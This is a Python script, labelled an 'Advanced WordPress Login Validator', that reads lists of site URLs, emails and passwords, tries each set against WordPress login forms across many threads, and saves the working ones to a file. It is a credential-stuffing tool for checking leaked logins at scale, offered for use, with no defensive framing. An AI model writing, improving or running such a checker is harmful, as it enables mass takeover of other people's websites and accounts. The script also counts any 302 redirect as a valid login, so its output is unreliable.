import requests
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
import re
import os
from threading import Lock

# Function to check WordPress login credentials
def check_wordpress_login(url, email, password):
    login_data = {
        'log': email,  # Username/Email field
        'pwd': password,  # Password field
        'wp-submit': 'Log In'  # Default WordPress submit button name
    }
    try:
        response = requests.post(url, data=login_data, timeout=10)
        if "wp-login.php?action=logout" in response.text or response.status_code == 302:
            return True
    except requests.exceptions.RequestException as e:
        print(colored(f"Error with login request: {e}", "yellow"))
        return False
    return False

# Function to convert the line into the desired format
# Function to convert the line into the desired format
def convert_to_required_format(line):
    try:
        # Automatically detect delimiters and split the line
        delimiters = ["|", "#", ":", "@"]  # Added "@" to the list of delimiters
        for delimiter in delimiters:
            if delimiter in line:
                parts = line.strip().split(delimiter)
                break
        else:
            raise ValueError("No valid delimiter found in line.")
        
        # Ensure proper format: URL, Email, Password
        if len(parts) != 3:
            raise ValueError("Line format is invalid. Expected 3 parts (URL, Email, Password).")
        
        url, email, password = parts
        
        # Validate URL format
        if not re.match(r'https?://[^\s]+', url):
            url = f'http://{url}'  # Add http:// if missing
        
        # Convert the line to the desired format: URL|Email|Password
        return f"{url}|{email}|{password}"
    
    except Exception as e:
        print(colored(f"Error converting line: {line.strip()} - {e}", "red"))
        return None

# Function to process a single line of credentials and write valid ones immediately
def process_line(line, seen_logins, output_file_lock, output_file):
    try:
        # Convert line to the desired format
        converted_line = convert_to_required_format(line)
        if converted_line is None:
            return None  # Skip invalid or non-convertible lines
        
        # Check for duplicates before proceeding
        if converted_line in seen_logins:
            return None  # Skip this duplicate login
        seen_logins.add(converted_line)

        # Extract the URL, Email, and Password after conversion
        url, email, password = converted_line.split("|")

        # Check the login
        if check_wordpress_login(url, email, password):
            print(colored(f"[VALID] {email} | {password} at {url}", "green"))

            # Instant write to the file, ensuring thread safety with output_file_lock
            with output_file_lock:
                with open(output_file, "a", encoding="utf-8") as valid_file:
                    valid_file.write(converted_line + "\n\n")  # Add extra line spacing between entries
            
            return converted_line  # Return valid login
        else:
            print(colored(f"[INVALID] {email} | {password} at {url}", "red"))
            return None

    except Exception as e:
        print(colored(f"Error processing line: {line.strip()} - {e}", "red"))
        return None

# Main function to process the wordlist
def main():
    print(colored("Advanced WordPress Login Validator Script", "cyan", attrs=["bold"]))
    wordlist_path = input("Enter the path to your WordPress credentials file: ").strip()
    output_file = "valid_logins.txt"

    # Ensure the output file exists and is empty before starting
    if os.path.exists(output_file):
        os.remove(output_file)  # Clear file content before starting

    try:
        # Read the wordlist
        with open(wordlist_path, "r", encoding="latin-1") as wordlist:
            lines = wordlist.readlines()
    except FileNotFoundError:
        print(colored("Error: File not found. Please check the path and try again.", "red"))
        return
    except UnicodeDecodeError as e:
        print(colored(f"Error decoding file: {e}.", "red"))
        return

    seen_logins = set()  # To track and remove duplicates

    # Thread safety with file operations: using a lock
    output_file_lock = Lock()

    # Use ThreadPoolExecutor for multi-threaded processing
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Process lines and instantly write valid logins to the file
        results = executor.map(lambda line: process_line(line, seen_logins, output_file_lock, output_file), lines)

    print(colored(f"Validation complete. Valid logins saved to {output_file}.", "cyan", attrs=["bold"]))

if __name__ == "__main__":
    main()